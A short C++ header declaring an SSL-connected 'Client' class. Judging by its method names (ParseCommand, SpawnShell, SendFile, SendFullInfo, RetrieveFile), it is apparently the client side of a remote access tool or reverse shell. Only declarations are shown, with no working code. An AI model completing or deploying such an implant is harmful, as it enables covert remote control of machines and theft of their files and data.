#ifndef __CLIENT
#define __CLIENT
#include "headers.hpp"
#include "HttpDownload.hpp"

class Client: public Downloader{
	private:
		std::mutex mtxMutex;
		int sckSocket;
		SSL_CTX *sslCTX = nullptr;
	public:
		SSL *sslSocket = nullptr;
		volatile bool isKeepRunning = true;
		volatile bool isRunningShell = false;
		bool Connect(c_char*, c_char*);
		void CloseConnection();
		~Client(){
			if(sslCTX){
				SSL_CTX_free(sslCTX);
			}
			if(sslSocket){
				SSL_free(sslSocket);
			}
			close(sckSocket);
		}
		bool ParseCommand(char*&);
		
		bool SendFile(const std::string);
		void SpawnShell(const std::string);
		void threadReadShell(int&);
		bool SendInfo();
		bool SendFullInfo();
		void RetrieveFile(u64, c_char, const std::string);
};

#endif
